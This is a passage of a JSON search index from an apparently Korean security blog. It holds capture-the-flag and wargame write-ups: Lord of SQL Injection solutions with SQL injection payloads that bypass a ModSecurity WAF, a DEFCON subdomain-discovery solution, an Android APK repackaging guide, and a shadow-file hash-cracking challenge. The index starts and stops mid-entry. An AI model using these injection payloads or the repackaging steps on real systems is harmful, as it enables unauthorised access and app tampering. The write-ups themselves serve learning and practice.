$_GET[id])) exit(\"No Hack ~_~\");  if(preg_match('/prob|_|\\.|\\(\\)/i', $_GET[pw])) exit(\"No Hack ~_~\");  $query = \"select id from prob_godzilla where id='{$_GET[id]}' and pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = @mysqli_fetch_array(mysqli_query($db,$query));  if($result['id']) echo \"&lt;h2&gt;Hello admin&lt;/h2&gt;\";     $_GET[pw] = addslashes($_GET[pw]);  $query = \"select pw from prob_godzilla where id='admin' and pw='{$_GET[pw]}'\";  $result = @mysqli_fetch_array(mysqli_query($db,$query));  if(($result['pw']) &amp;&amp; ($result['pw'] == $_GET['pw'])) solve(\"godzilla\");  highlight_file(__FILE__);?&gt;GODZILLA Clear!",
        "url": "//wargame/lord%20of%20sql%20injection/2019/06/14/los-godzilla.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2019-06-13-los-death-html": {
        "title": "[Lord of SQL Injection] LoS - death 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "June 13, 2019",
        "author": "",
        "category": "",
        "content": "두 번째 문제는 death이다.이 전 문제와 비슷해서 쉽게 풀 수 있었다.코드는 다음과 같다.-----------------------------------------------------------------query : select id from prob_death where id='' and pw=md5('')-----------------------------------------------------------------&lt;?php  include \"./config.php\";   login_chk();  $db = dbconnect();  if(preg_match('/prob|_|\\.|\\(\\)|admin/i', $_GET[id])) exit(\"No Hack ~_~\");   if(preg_match('/prob|_|\\.|\\(\\)|admin/i', $_GET[pw])) exit(\"No Hack ~_~\");   $query = \"select id from prob_death where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysqli_fetch_array(mysqli_query($db,$query));   if($result['id'] == 'admin') solve(\"death\");  elseif($result['id']) echo \"&lt;h2&gt;Hello {$result['id']}&lt;br&gt;You are not admin :(&lt;/h2&gt;\";   highlight_file(__FILE__); ?&gt;이 전 문제와 동일하게 방화벽이 걸려 있으며, 다른점은 pw가 md5로 해싱된다는 것과 추출한 결과의 id 값이 admin이어야 한다는 것이다.언뜻 보기에는 admin의 정확한 pw 값을 알아야 할 것 같다.하지만 어찌어찌 방화벽을 우회해서 DB에 저장된 pw 값을 뽑아낸다 하더라도 그 값은 md5로 해싱 된 값이기 때문에 pw를 복구하기가 어렵다.때문에 뒤의 pw를 검사하는 부분을 무시하도록 혹은 검증하지 않도록 공격을 수행해야 한다.이를 위해 내가 생각한 쿼리는 다음과 같다.id=-1'&lt;@=1 OR id&lt;'guest' OR '&amp;pw=a이를 입력하면 완성되는 쿼리는 다음과 같다.select id from prob_death where id='-1'&lt;@=1 OR id&lt;'guest' OR '' and pw=md5('a')where 절을 살펴보면 조건은 크게 3개이다.첫 번째로 id='-1'&lt;@1은 이 전 문제에서 설명했다시피 '-1'&lt;@1이 NULL이 되며 id=NULL이 되기 때문에 거짓이 된다.이 때, 두 번째 조건은 id&lt;'guest'이다.  id의 값이 guest 보다 작은 값을 찾게 되는데, 이는 테이블에 값이 admin과 guest만 있다고 가정하고 사용 한 조건이다.알파벳 a는 g보다 값이 작기 때문에 admin의 값은 guest보다 작다.만약 테이블에 admin과 guest의 두 값만 있다면, id&lt;'guest'의 결과는 당연히 admin이 될 것이다.여기서 두 번째 조건이 참이 되었기 때문에 뒤의 '' and pw=md5('a')는 무시하게 된다.해당 쿼리를 문제에 전달하면 아래와 같이 admin 값을 추출하며 문제를 풀 수 있다.-------------------------------------------------------------------------------------------query : select id from prob_death where id='-1'&lt;@=1 OR id&lt;'guest' OR '' and pw=md5('a')-------------------------------------------------------------------------------------------DEATH Clear!&lt;?php  include \"./config.php\";   login_chk();  $db = dbconnect();  if(preg_match('/prob|_|\\.|\\(\\)|admin/i', $_GET[id])) exit(\"No Hack ~_~\");   if(preg_match('/prob|_|\\.|\\(\\)|admin/i', $_GET[pw])) exit(\"No Hack ~_~\");   $query = \"select id from prob_death where id='{$_GET[id]}' and pw=md5('{$_GET[pw]}')\";   echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";   $result = @mysqli_fetch_array(mysqli_query($db,$query));   if($result['id'] == 'admin') solve(\"death\");  elseif($result['id']) echo \"&lt;h2&gt;Hello {$result['id']}&lt;br&gt;You are not admin :(&lt;/h2&gt;\";   highlight_file(__FILE__); ?&gt;DEATH Clear!",
        "url": "//wargame/lord%20of%20sql%20injection/2019/06/13/los-death.html"
      }
      ,
    
      "wargame-lord-20of-20sql-20injection-2019-06-12-los-cthulhu-html": {
        "title": "[Lord of SQL Injection] LoS - cthulhu 문제풀이",
        "tags": "Write-up, Lord of SQL Injection",
        "date": "June 12, 2019",
        "author": "",
        "category": "",
        "content": "며칠 전, 2번에 걸쳐서 LoS의 문제가 업데이트 되었다.이번이 랭킹에 이름을 올릴 수 있는 기회이길래 얼른 다 풀었다.까먹기 전에 정리를 해 두려 한다.첫 번째 문제 이름은 cthulhu이다.코드는 다음과 같다.modsec.rubiya.kr server is running ModSecurity Core Rule Set v3.1.0 with paranoia level 1(default).It is the latest version now.(2019.05)Can you bypass the WAF?-------------------------------------------------------------query : select id from prob_cthulhu where id='' and pw=''-------------------------------------------------------------&lt;?php  include \"./welcome.php\";  include \"./config.php\";  login_chk();  $db = dbconnect();  if(preg_match('/prob|_|\\.|\\(\\)|admin/i', $_GET[id])) exit(\"No Hack ~_~\");  if(preg_match('/prob|_|\\.|\\(\\)|admin/i', $_GET[pw])) exit(\"No Hack ~_~\");  $query = \"select id from prob_cthulhu where id='{$_GET[id]}' and pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = @mysqli_fetch_array(mysqli_query($db,$query));  if($result['id']) solve(\"cthulhu\");  highlight_file(__FILE__);?&gt;문제의 소스코드 자체는 어렵지 않다.그런데 ModSecurity Core Rule Set v3.1.0 이라는 방화벽이 추가되어 있다.그래서 흔히 사용하는 방법으로 SQL Injection을 시도하면 자꾸 Forbidden Error가 나온다.때문에 방화벽을 우회 해 문제를 풀어야 한다.일단 나는 ModSecurity Core Rule Set이 뭔지를 몰라서 구글에 검색을 해 보았다.그러다 아래와 같은 사이트를 찾았다.https://github.com/SpiderLabs/owasp-modsecurity-crs/issues/1181여기에 적힌 방법 중 아래의 방법으로 문제를 풀 수 있었다.-1'&lt;@=1 OR {a 1}=1 OR '이 내용을 문제에 적용하면 다음과 같다.id=-1'&lt;@=1 OR 1=1 OR '&amp;pw=a{a 1}=1 부분은 1=1로 변경했다.해당 구문이 이해가 되지 않아서였는데, {a 1}=1은 테스트 해 보면 true가 되며, select {a 1}을 하면 1이 나온다.아마도 아래의 이유 때문인 것 같은데, 정확하지 않아서 연구를 더 해봐야 알 것 같다.https://dev.mysql.com/doc/refman/5.7/en/expressions.html{identifier expr} is ODBC escape syntax and is accepted for ODBC compatibility. The value is expr. The { and } curly braces in the syntax should be written literally; they are not metasyntax as used elsewhere in syntax descriptions.어쨌든 해당 쿼리를 전달하면, 최종적으로 완성되는 쿼리는 다음과 같다.select id from prob_cthulhu where id='-1'&lt;@=1 OR 1=1 OR '' and pw='a'where 절의 조건을 살펴보면 크게 id='-1'&lt;@=1, 1=1, '' and pw='a'로 나눌 수 있을 것이다.먼저 첫 번째 조건인 id='-1'&lt;@1의 경우, '-1'&lt;@1이 NULL이 되면서 id=NULL로 만들어진다.당연히 id=NULL인 행은 없기 때문에 다음 조건으로 넘어가게 된다.이 때 두 번째 조건은 1=1 이므로 참이 되어 디비에서 값을 추출할 수 있게 된다.문제에서는 id의 값이 무엇이든, id를 추출할 수 있기만 하면 되므로, 위의 쿼리를 통해 문제를 풀 수 있다.modsec.rubiya.kr server is running ModSecurity Core Rule Set v3.1.0 with paranoia level 1(default).It is the latest version now.(2019.05)Can you bypass the WAF?---------------------------------------------------------------------------------------query : select id from prob_cthulhu where id='-1'&lt;@=1 OR 1=1 OR '' and pw='a'---------------------------------------------------------------------------------------CTHULHU Clear!&lt;?php  include \"./welcome.php\";  include \"./config.php\";  login_chk();  $db = dbconnect();  if(preg_match('/prob|_|\\.|\\(\\)|admin/i', $_GET[id])) exit(\"No Hack ~_~\");  if(preg_match('/prob|_|\\.|\\(\\)|admin/i', $_GET[pw])) exit(\"No Hack ~_~\");  $query = \"select id from prob_cthulhu where id='{$_GET[id]}' and pw='{$_GET[pw]}'\";  echo \"&lt;hr&gt;query : &lt;strong&gt;{$query}&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;\";  $result = @mysqli_fetch_array(mysqli_query($db,$query));  if($result['id']) solve(\"cthulhu\");  highlight_file(__FILE__);?&gt;CTHULHU Clear!",
        "url": "//wargame/lord%20of%20sql%20injection/2019/06/12/los-cthulhu.html"
      }
      ,
    
      "ctf-2019-2019-05-18-defcon2019-unplug-html": {
        "title": "[DEFCON 2019 Quals] cant_even_unplug_it Write-up",
        "tags": "Write-up, Defcon CTF",
        "date": "May 18, 2019",
        "author": "",
        "category": "",
        "content": "지난 주말에 Defcon CTF 2019에 참여했다.쉬운 한 문제를 풀어서 이 문제 풀이를 정리 해 두려 한다.문제 정보는 다음과 같다.cant_even_unplug_itYou know, we had this up and everything. Prepped nice HTML5, started deploying on a military-grade-secrets.dev subdomain, got the certificate, the whole shabang. Boss-man got moody and wanted another name, we set up the new names and all. Finally he got scared and unplugged the server. Can you believe it? Unplugged. Like that can keep it secret…Files:HINT분명히 태그는 WEB이라고 되어있었는데 주어진 URL이 없다…그래서 먼저 주어진 HINT 파일을 확인 해 보았다.HINT 파일 내용은 다음과 같다.Hint: these are HTTPS sites. Who is publicly and transparently logging the info you need?Just in case: all info is freely accessible, no subscriptions are necessary. The names cannot really be guessed. 근데 힌트를 읽어도 도대체 이게 무슨 문제인지를 모르겠었다.일단 문제에서 주어진 유일한 URL인 military-grade-secrets.dev에 접속 해 보았다.그랬더니 https로 넘어가는 것을 확인할 수 있었다.서버가 존재하지 않는다면 그냥 아무것도 뜨지 않아야 하는데 https로 연결되는 것을 보니 뭔가 있긴 있는 것 같았다.그래서 Sublist3r를 통해 위의 도메인을 검색 해 보니 아래와 같은 결과를 얻을 수 있었다.# python sublist3r.py -d military-grade-secrets.dev                 ____        _     _ _     _   _____                / ___| _   _| |__ | (_)___| |_|___ / _ __                \\___ \\| | | | '_ \\| | / __| __| |_ \\| '__|                 ___) | |_| | |_) | | \\__ \\ |_ ___) | |                |____/ \\__,_|_.__/|_|_|___/\\__|____/|_|                # Coded By Ahmed Aboul-Ela - @aboul3la    [-] Enumerating subdomains now for military-grade-secrets.dev[-] Searching now in Baidu..[-] Searching now in Yahoo..[-] Searching now in Google..[-] Searching now in Bing..[-] Searching now in Ask..[-] Searching now in Netcraft..[-] Searching now in DNSdumpster..[-] Searching now in Virustotal..[-] Searching now in ThreatCrowd..[-] Searching now in SSL Certificates..[-] Searching now in PassiveDNS..[-] Total Unique Subdomains Found: 2now.under.even-more-militarygrade.pw.military-grade-secrets.devsecret-storage.military-grade-secrets.dev2개의 도메인을 찾을 수 있었다.그런데 이 두 도메인 모두 접속하면 아무것도 뜨지는 않는다.그래서 curl을 이용 해 두 도메인을 확인 해 보았더니 아래와 같이 같은 결과를 얻을 수 있었다.# curl now.under.even-more-militarygrade.pw.military-grade-secrets.dev&lt;HTML&gt;&lt;HEAD&gt;&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;&lt;TITLE&gt;302 Moved&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;302 Moved&lt;/H1&gt;The document has moved&lt;A HREF=\"https://forget-me-not.even-more-militarygrade.pw/\"&gt;here&lt;/A&gt;.&lt;/BODY&gt;&lt;/HTML&gt;# curl secret-storage.military-grade-secrets.dev&lt;HTML&gt;&lt;HEAD&gt;&lt;meta http-equiv=\"content-type\" content=\"text/html;charset=utf-8\"&gt;&lt;TITLE&gt;302 Moved&lt;/TITLE&gt;&lt;/HEAD&gt;&lt;BODY&gt;&lt;H1&gt;302 Moved&lt;/H1&gt;The document has moved&lt;A HREF=\"https://forget-me-not.even-more-militarygrade.pw\"&gt;here&lt;/A&gt;.&lt;/BODY&gt;&lt;/HTML&gt;두 도메인 모두 https://forget-me-not.even-more-militarygrade.pw라는 도메인을 알려준다.하지만 이 도메인도 접속하면 아무것도 뜨지 않는다.그런데 이 도메인을 구글에 검색하고 아래와 같이 저장된 페이지를 확인 해 보면 플래그를 찾을 수 있다.FLAG : OOO{DAMNATIO_MEMORIAE}",
        "url": "//ctf/2019/2019/05/18/defcon2019-unplug.html"
      }
      ,
    
      "pentesting-android-2019-04-21-android-analysis-1-html": {
        "title": "[Android] 안드로이드 어플리케이션 디컴파일 및 리패키징",
        "tags": "Android, pen-testing",
        "date": "April 21, 2019",
        "author": "",
        "category": "",
        "content": "apktool을 이용하여 안드로이드 어플리케이션을 리패키징 할 수 있다는 사실을 알았다.까먹을 것 같아 방법을 정리 해 두려 한다.어플리케이션을 리패키징 하는 과정은 크게 5단계 인 것 같다.  apktool 설치  분석 및 리패키징 할 APK 다운  어플리케이션 분석  어플리케이션 디컴파일 및 코드 수정  빌드 및 sign위의 순서에 따라 과정을 차근차근 적어보려 한다.apktool 설치하기apktool의 공식 홈페이지는 여기이다.나는 윈도우를 사용할 것이므로, 윈도우 기준으로 설치할 것이다.설치 과정은 다음과 같다.      https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/windows/apktool.bat 에서 apktool.bat 다운받기                        위의 링크 클릭 후 마우스 오른쪽 버튼 클릭 → 다른 이름으로 저장 → apktool.bat으로 저장 혹은 해당 내용 복사 후 apktool.bat으로 저장                      https://bitbucket.org/iBotPeaches/apktool/downloads/ 에서 apktool.jar 다운받기                        최신 버전의 apktool.jar 다운 후, 이름을 apktool.jar로 변경                      다운받은 apktool.bat과 apktool.jar를 C://Windows에 옮기기  여기까지 하면 apktool을 사용 할 준비가 끝난다.APK 다운그럼 이제 분석 할 APK와 이를 분석 할 jd-gui를 다운받아야 한다.APK는 아래의 링크에서 검색 해 다운받을 수 있다.  https://apkpure.com/해당 링크에서 오른쪽의 검색 창에 다운받을 어플리케이션의 이름을 입력하면 APK 파일을 다운받을 수 있다.어플리케이션 분석 툴 다운다음 단계는 어플리케이션을 분석해야 하는데, 분석을 위해서는 또 다른 툴이 필요하다.jadx라는 툴인데, 무료로 제공되며 apk 파일을 바로 java 코드로 볼 수 있게 해 준다.  https://github.com/skylot/jadx아래와 같이 해당 링크를 클릭하면 최신 버전의 jadx를 다운받을 수 있다.링크 클릭 시 3개의 파일이 있을텐데 이 중 zip 파일을 다운받으면 된다.압축을 해제하고 이 중 jadx-gui.bat을 실행시키면 된다.Windows 10의 경우 경고화면이 나올 수 있는데, 추가 정보 보기를 클릭 후 실행 버튼을 누르면 정상적으로 실행할 수 있다.실행 후 분석할 APK 파일을 열면 JAVA 코드로 디컴파일 된 것을 확인할 수 있다.어플리케이션 리패키징 하기이제 드디어 모든 준비가 끝나고 어플리케이션을 리패키징 할 차례이다.리패키징을 하기 위해서는 먼저 디컴파일을 하고 코드를 수정한 후, 다시 빌드를 하고 마지막으로 어플리케이션에 서명을 해 주어야 한다.디컴파일을 하는 방법은 다음과 같다.apktool d [APK 파일 경로]그럼 명령어를 실행 한 디렉토리에 디컴파일 된 APK 파일을 확인할 수 있다.나의 경우에는 cmd를 실행 한 경로가 C:\\Users\\USERNAME 이었기에 디컴파일 된 폴더도 같은 곳에 생성되었다.이 중 smali라는 디렉토리가 있는데, 이 디렉토리 안을 보면 jadx에서 본 구조와 동일한 것을 알 수 있다.따라서 smali 디렉토리에서 jadx와 비교하며 고칠 부분을 찾은 후, .smali 코드를 수정한 후 다시 빌드하면 어플리케이션을 리패키징 할 수 있다.리패키징 방법은 다음과 같다.apktool b [디렉토리 명]그럼 아래와 같이 dist 디렉토리가 생성되며, 그 안에 apk 파일이 생성 된 것을 확인할 수 있다.APK 서명하기이제 마지막으로 서명을 해야 정상적으로 어플리케이션을 실행시킬 수 있다.서명을 위한 파일은 여기에 있다.해당 디렉토리에 서명 할 APK 파일을 넣고, 아래의 명령어를 실행하면 정상적으로 서명 된 것을 확인할 수 있다.java -jar signapk.jar testkey.x509.pem testkey.pk8 [서명할 APK 이름] [서명 후의 APK 명]위의 명령어를 실행 한 결과 아래와 같이 apk가 새로 생성 된 것을 확인할 수 있다.이제 이 apk 파일을 실행시키면 정상적으로 동작 할 것이다.",
        "url": "//pentesting/android/2019/04/21/Android-Analysis_1.html"
      }
      ,
    
      "ctf-2019-2019-04-08-shadow-cat-writeup-html": {
        "title": "[VolgaCTF2019] Shadow Cat Write up",
        "tags": "Write-up, VolgaCTF2019",
        "date": "April 8, 2019",
        "author": "",
        "category": "",
        "content": "지난 주말에 잠시 짬을 내어 VolgaCTF에 참여했다.원래 풀고싶었던 문제는 Head Hunter 였는데, 끝까지 Write-up이 올라오지 않아 결국 풀어볼 수가 없었다.대신 Shadow Cat이라는 문제를 풀어 보았다.문제 정보는 다음과 같다.We only know that one used /etc/shadow file to encrypt important message for us.shadow.txt encrypted.txt파일이 2개가 주어지는데, 내용은 각각 다음과 같다.  shadow.txt    root:!:17792:0:99999:7:::daemon:*:17737:0:99999:7:::bin:*:17737:0:99999:7:::sys:*:17737:0:99999:7:::sync:*:17737:0:99999:7:::games:*:17737:0:99999:7:::man:*:17737:0:99999:7:::lp:*:17737:0:99999:7:::mail:*:17737:0:99999:7:::news:*:17737:0:99999:7:::uucp:*:17737:0:99999:7:::proxy:*:17737:0:99999:7:::www-data:*:17737:0:99999:7:::backup:*:17737:0:99999:7:::list:*:17737:0:99999:7:::irc:*:17737:0:99999:7:::gnats:*:17737:0:99999:7:::nobody:*:17737:0:99999:7:::systemd-network:*:17737:0:99999:7:::systemd-resolve:*:17737:0:99999:7:::syslog:*:17737:0:99999:7:::messagebus:*:17737:0:99999:7:::_apt:*:17737:0:99999:7:::uuidd:*:17737:0:99999:7:::avahi-autoipd:*:17737:0:99999:7:::usbmux:*:17737:0:99999:7:::dnsmasq:*:17737:0:99999:7:::rtkit:*:17737:0:99999:7:::cups-pk-helper:*:17737:0:99999:7:::speech-dispatcher:!:17737:0:99999:7:::whoopsie:*:17737:0:99999:7:::kernoops:*:17737:0:99999:7:::saned:*:17737:0:99999:7:::pulse:*:17737:0:99999:7:::avahi:*:17737:0:99999:7:::colord:*:17737:0:99999:7:::hplip:*:17737:0:99999:7:::geoclue:*:17737:0:99999:7:::gnome-initial-setup:*:17737:0:99999:7:::gdm:*:17737:0:99999:7:::jr:$6$jKcSVswg$AWA/PLZVcOcQb6404vSsjmyJzgtC97R3iRDXSOBshuYmCcDVDhaIS6C4fVZnOI6EGhaUnrUWK2Y3jYhQ4vcmu0:17792:0:99999:7:::vboxadd:!:17792::::::zerotier-one:!:17792::::::postgres:*:17793:0:99999:7:::postfix:*:17794:0:99999:7:::lightdm:*:17930:0:99999:7:::z:$6$AEqLtEqq$1ojEoCgug5dzqeNfjGNE9p5SZFwIul8uOFp9vMZEz50oiUXOVFW3lw1S0fuvFY5ggi5CfbfoWaMDr2bvtSNRC/:17930:0:99999:7:::a:$6$9Eg69bYI$q75YWUVWb4MYzkcExXukpt.VJ3fX458iZJm1ygpTLwX.CgroHpmeSG88By.zQmKyOHCvBHoA0Q001aBqbkVpg/:17930:0:99999:7:::x:$6$5TF0Txe3$APSNzUSjFmMbsmrkCS9qE84qfu4AI2dNEjqm2PRKgSjncBTI4lECXofQ8abdAtYX6tST6FGCgOdvLlDYQTCJx0:17930:0:99999:7:::q:$6$I3iqZL0m$nxHWvcLz7lg/ZKoKfX9dq5k0uqkOtKgLdyREAQxQkfPkVvbNHPfQaoCFfnXl1BoX1vgOcEDghVPvfRUrs6dGp1:17930:0:99999:7:::l:$6$n8iJWaW/$M1Od8seiEL6h3L.egHubBYAk.cd8/LUctESIm69/r.gvP0eqabusN5/D1rNu1qDHOkgRpHf8PWGSb8zoxrgrp1:17930:0:99999:7:::v:$6$GatagTHS$I1UfNfn3NGP5Vre0z7s3DGqFpjN5Pw2XhAHSw6ZSMwaMAsf8IteFedXovNlHLuIXvR9ezeya89XEOq2We7CcW1:17930:0:99999:7:::e:$6$ZO6YiExi$7DBV0zMIqf8iy.zVTL7gbHetCmJ3LL4ROEYG/UME4Tmym82vZYkFWjiNpCGapvF83QNJKFJOjkhXMgFLfkhza.:17930:0:99999:7:::f:$6$HXoF2OZ1$onkVfp52IRdd2OipQv3rPPsGr7QradAFTFnmXv5c9xkGy4xcgJFkoaSJzMQCtfWuU2FQ3BN3lyL47SyoIoPmy0:17930:0:99999:7:::b:$6$I9Uq9PRG$euVEYx5TR2lUFe/k7s0e8us8xgl7j/cbiYRnvba.eFfMSSPsm5I.gcShqOLqAa58m5VISomkPpHlJ1xLgCRxw/:17930:0:99999:7:::r:$6$J.qms5y0$YOMnlR0V.WQjqAyik3nU7TDdy8hZQZWfhF8CTJHJtd/0mrANrxBvULoXNiJnvX.yn5T3QBFu4wk3xrFye.uus1:17930:0:99999:7:::g:$6$b4GkIuzQ$j/prK.Jy304eu6W/NG0Yz4mHDOc3BavkYRBomdjVG.fAksRM/xIDRoWcKcJw66YZmVGcV51YkIwVZHVfA//KU.:17930:0:99999:7:::n:$6$f2QD.cIu$n70jbCSe0QVz7M48SVE2Z..IPDV0QjIfZ8D40oQOO9smt0ZeA2I0sSO927VIr1SJwupjZairVR0T/pKQ0QG3N1:17930:0:99999:7:::o:$6$qyBGOX79$OAvGVjmH69C.0ZfObcJ0DcKzoSWHhBBt9sPVjbIJtYmT4nV/TU/zCiKgCkSQaQJ.n.vTjAScdh9htzjBzTwOT/:17930:0:99999:7:::p:$6$EW1gOlyH$omuxKElrI3DeVoxrLet3OW3MfuFPwLwefVxOr62E.wo7szQ6.swTec1edCFiKnPc42XxMRGsrNJn36mkc2dgH/:17930:0:99999:7:::s:$6$TXxh4vV5$v1vF49YZQnonSZrKwBWNp7rpxIRoQY/ooEODqjsdwwdoY8sso.y/EOsoC3GFlpCLYnEY./n/1BuNID5njg0CV.:17930:0:99999:7:::c:$6$IYxRoIyR$eEmGTNPNd6HPQibc/UBdQ5zgR/dGQ1dtCuSl0lUmvmbrSKbYEf/SEDlX4fgP.JQXlyFqEgu4NOBiu2eozpAM.0:17930:0:99999:7:::w:$6$RmCyBroe$EovezmWQJVvQFGd6.ei2.SfzGJG22CsV47tTnyfKx30TbuG1VMgsk0de6NOQ04bKNML9fbuMu0Pw3TMf82zye1:17930:0:99999:7:::d:$6$..CK41Sn$36X19X0jrviLxVVk.KtR9zbHMML0mg1XzMNQgP7eOpGMF1JYSbZHAyReDhNVkm1WaNn3lfO2CsAww14fZZads1:17930:0:99999:7:::t:$6$zVFV5HoW$q9WyP6/D0kPL.n7s.FvPcOSRfvcUFQu5QMPps6VbQUD5RMozQsP14GtUiOa/H2V2pU6c6OxcgRqruaLejPaES1:17930:0:99999:7:::h:$6$S1RnJ8DK$F/FWFf9En/mn6YqZ67/gOnMT0WdSuaEyn2OArTJbG1IGHd0pUs9TiGDE9P.PhRB6XyHUgA5l/LBmBW8PpJg9M.:17930:0:99999:7:::m:$6$SqkKQRak$nZHDrq3vdnajdLzotrW3J9kYzUvzPaUrs6NZaKkkcVN0KiCfUhJfgM6WJvZjZR7hBGWkfIwhZymko7wtsq49s1:17930:0:99999:7:::k:$6$ZLCr2itT$tZ0.u7TsXPc3nAntIOepETGkhqfVG1IKaiuW0mAH5QROVuc7fonE43qEhUFT2LHMftYDdTQRAMHpRNMM8Yn1c1:17930:0:99999:7:::i:$6$ZlWmheB2$DBLJQPLVhhEdA/iATrOYiqFv4i5TcmBUSX6.tZDo63YP4dcdlAuBnFU65xXIRP1tpNsCS7kc6Fu6jPMS2F7aP1:17930:0:99999:7:::y:$6$rIoO6U2u$c5usMXbFP9S75qmDyBBWz1QZuyGH0MGq3mXN32kYipoL5XCFEHjmTRVcuZkmed5OzAopV0CgyA49QzILz5Rmq/:17930:0:99999:7:::j:$6$Gpavrajq$me1yxZQ0OiJFedrTmxFsyP5zwOePuFJmgujUWun0h5bCOIVeuJuaIUTDHGCYxkT6mw41BTjlx9c3QvdsG8o0o.:17930:0:99999:7:::u:$6$0w3EeszD$bUDQorjCKku1sjtCWMQfJ3ZRmsC5N.LN7CQnjvyCbcq5wSD33x2t/TVXA6jnjtajv8nIZc.Aj.oY80lm44Dhy0:17930:0:99999:7:::underscore:$6$RVUCQJFr$fsKkPUT9Pp5QlsZblSLJ4yKkfBxNMWN0TS.q7ticuEr/HQFdEbyiwK5JmaKKS9UDFzUsY6mhe1knnRbwy7K0s/:17930:0:99999:7:::        encrypted.txt    hajjzvajvzqyaqbendzvajvqauzarlapjzrkybjzenzuvczjvastlj      shadow.txt 파일을 보면 /etc/shadow 파일의 형태와 비슷하다./etc/shadow 파일은 root만이 읽을 수 있는 파일이며, 시스템의 모든 사용자에 대한 해시값을 저장한다./etc/shadow 파일에서 각 값의 구조는 다음과 같다.jr:$6$jKcSVswg$AWA/PLZVcOcQb6404vSsjmyJzgtC97R3iRDXSOBshuYmCcDVDhaIS6C4fVZnOI6EGhaUnrUWK2Y3jYhQ4vcmu0:17792:0:99999:7:::Login Name:Encrypted:Last Changed:Minimum:Maximum:Warn:Inactive:Expire:Reserved            항목      내용                  Login Name      사용자 이름              Encrypted      패스워드를 암호화 시킨 값              Last Changed      1970년 1월 1일부터 패스워드가 수정된 날짜의 일 수 계산              Minimum      패스워드가 변경되기 전 최소 사용 일 수              Maximum      패스워드 변경 전 최대 사용 일 수              Warn      패스워드 사용 만기일 전 경고 메시지 제공 일 수              Inactive      로그인 접속 차단 일 수              Expire      로그인 사용 금지하는 일 수              Reserved      사용되지 않음      또한 Encrypted를 자세히 살펴 보면 $로 구분되는 것을 알 수 있다.이 값들은 다음과 같다.$HashId$salt$Hash Value            항목      내용                  HashId      Hash 종류. $1 → MD5 / $5 → SHA256 / $6 → SHA512              salt      hashing에 사용되는 값              Hash Value      HashId에 따른 hashing 방법과 salt를 가지고 hashing을 한 값      즉, 문제에서 제공한 shadow.txt 파일은 SHA512를 가지고 hashing을 수행했다는 것을 알 수 있다.그런데 다시 문제를 살펴보면, encrypted.txt 파일은 알파벳 소문자로 구성되어 있고, shadow.txt 파일에 Login Name을 보면, 알파벳 소문자들이 있다는 것을 확인할 수 있다.아마도 shadow.txt 파일에서 알파벳 소문자로 된 user 들의 패스워드를 크랙한 뒤, encrypted.txt를 복구하는 문제인 것 같다.일단 shadow.txt 파일에서 패스워드를 크랙하기 전에 불필요한 user를 정리 해 주었다.z:$6$AEqLtEqq$1ojEoCgug5dzqeNfjGNE9p5SZFwIul8uOFp9vMZEz50oiUXOVFW3lw1S0fuvFY5ggi5CfbfoWaMDr2bvtSNRC/:17930:0:99999:7:::a:$6$9Eg69bYI$q75YWUVWb4MYzkcExXukpt.VJ3fX458iZJm1ygpTLwX.CgroHpmeSG88By.zQmKyOHCvBHoA0Q001aBqbkVpg/:17930:0:99999:7:::x:$6$5TF0Txe3$APSNzUSjFmMbsmrkCS9qE84qfu4AI2dNEjqm2PRKgSjncBTI4lECXofQ8abdAtYX6tST6FGCgOdvLlDYQTCJx0:17930:0:99999:7:::q:$6$I3iqZL0m$nxHWvcLz7lg/ZKoKfX9dq5k0uqkOtKgLdyREAQxQkfPkVvbNHPfQaoCFfnXl1BoX1vgOcEDghVPvfRUrs6dGp1:17930:0:99999:7:::l:$6$n8iJWaW/$M1Od8seiEL6h3L.egHubBYAk.cd8/LUctESIm69/r.gvP0eqabusN5/D1rNu1qDHOkgRpHf8PWGSb8zoxrgrp1:17930:0:99999:7:::v:$6$GatagTHS$I1UfNfn3NGP5Vre0z7s3DGqFpjN5Pw2XhAHSw6ZSMwaMAsf8IteFedXovNlHLuIXvR9ezeya89XEOq2We7CcW1:17930:0:99999:7:::e:$6$ZO6YiExi$7DBV0zMIqf8iy.zVTL7gbHetCmJ3LL4ROEYG/UME4Tmym82vZYkFWjiNpCGapvF83QNJKFJOjkhXMgFLfkhza.:17930:0:99999:7:::f:$6$HXoF2OZ1$onkVfp52IRdd2OipQv3rPPsGr7QradAFTFnmXv5c9xkGy4xcgJFkoaSJzMQCtfWuU2FQ3BN3lyL47SyoIoPmy0:17930:0:99999:7:::b:$6$I9Uq9PRG$euVEYx5TR2lUFe/k7s0e8us8xgl7j/cbiYRnvba.eFfMSSPsm5I.gcShqOLqAa58m5VISomkPpHlJ1xLgCRxw/:17930:0:99999:7:::r:$6$J.qms5y0$YOMnlR0V.WQjqAyik3nU7TDdy8hZQZWfhF8CTJHJtd/0mrANrxBvULoXNiJnvX.yn5T3QBFu4wk3xrFye.uus1:17930:0:99999:7:::g:$6$b4GkIuzQ$j/prK.Jy304eu6W/NG0Yz4mHDOc3BavkYRBomdjVG.fAksRM/xIDRoWcKcJw66YZmVGcV51YkIwVZHVfA//KU.:17930:0:99999:7:::n:$6$f2QD.cIu$n70jbCSe0QVz7M48SVE2Z..IPDV0QjIfZ8D40oQOO9smt0ZeA2I0sSO927VIr1SJwupjZairVR0T/pKQ0QG3N1:17930:0:99999:7:::o:$6$qyBGOX79$OAvGVjmH69C.0ZfObcJ0DcKzoSWHhBBt9sPVjbIJtYmT4nV/TU/zCiKgCkSQaQJ.n.vTjAScdh9htzjBzTwOT/:17930:0:99999:7:::p:$6$EW1gOlyH$omuxKElrI3DeVoxrLet3OW3MfuFPwLwefVxOr62E.wo7szQ6.swTe